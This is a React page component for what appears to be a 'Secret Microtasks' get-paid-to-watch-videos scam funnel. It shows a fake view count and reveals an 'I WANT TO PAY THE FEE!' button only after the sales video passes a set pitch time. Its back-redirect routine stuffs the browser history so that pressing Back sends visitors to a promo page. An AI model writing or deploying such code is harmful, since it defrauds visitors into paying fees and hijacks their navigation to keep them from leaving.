import Logo from "@/components/logo";
import Button from "@/components/button";
import Balance from "@/components/balance";
import Comments from "@/components/comments";
import VSLBlackNew from "@/components/videos/vsl-black-new";
import { useLayer } from '@/context/layer-provider';
import { useEffect, useState } from 'react';
import { CheckCheck, Loader2 } from 'lucide-react';

export default function Page() {

  // COMPONENT STATES
  const [visible, setVisible] = useState<boolean>(false);

  // IMPORT CONTEXT DATA
  const { host, active, frontLink, handleButtonClick } = useLayer();

  // SET CONTENT DATA
  const VSL = VSLBlackNew;
  const videoId = "68ffb7d22ad758e3709e1303";
  const backLink = `https://${host}/promo`;
  const pitchTime = 780;

  // VIDEO VERIFY
  useEffect(() => {
    if (!visible) {
      const intervalId = setInterval(() => {
        const storedVideoTime = Number(localStorage.getItem(videoId + '-resume'));
        if (storedVideoTime > pitchTime) {
          setVisible(true);
        };
      }, 1000);
      return () => clearInterval(intervalId);
    };
  }, [videoId, visible]);

  // BACK REDIRECT
  useEffect(() => {
    function setBackRedirect(url: string) {
      let urlBackRedirect = url;
      urlBackRedirect =
        urlBackRedirect.trim() +
        (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
        document.location.search.replace('?', '').toString();
      history.pushState({}, '', location.href);
      history.pushState({}, '', location.href);
      history.pushState({}, '', location.href);
      window.addEventListener('popstate', () => {
        console.log('onpopstate', urlBackRedirect);
        setTimeout(() => {
          location.href = urlBackRedirect;
        }, 1);
      });
    };

    setBackRedirect(backLink);
  }, [backLink]);

  return (
    <div className="flex flex-col gap-5 sm:gap-6 appear">
      <div className="flex justify-between items-center">
        <Logo
          width={100}
          height={50}
        />
        <Balance />
      </div>
      <div className="flex flex-col rounded-2xl border shadow-lg gap-4 p-3 sm:p-4 bg-white border-gray-400/20 shadow-black/10">
        <VSL />
        <div className="flex flex-col gap-1.5 rounded-lg p-3 bg-gray-100/50">
          <span className="font-semibold tracking-tight">
            <span className="font-bold text-red-600">Secret Microtasks: </span>
            Earned money by watching videos? To cash out and complete more microtasks, watch this 4-minute tutorial.
          </span>
          <span className="text-sm tracking-tight opacity-60">
            2.3M views • 4 days ago
          </span>
          {visible && (
            <a href={frontLink} className="block mx-auto my-8">
              <Button
                onClick={handleButtonClick}
                disabled={active}
                className="pulse p-5 !bg-gradient-to-b !from-green-500 !to-green-600 hover:!from-green-400 hover:!to-green-500"
              >
                {active ? (
                  <Loader2 className="size-5 animate-spin" />
                ):(
                  <CheckCheck className="size-5" />
                )}
                <span className="text-sm">
                  I WANT TO PAY THE FEE!
                </span>
              </Button>
            </a>
          )}
        </div>
      </div>
      <Comments />
    </div>
  );
  
};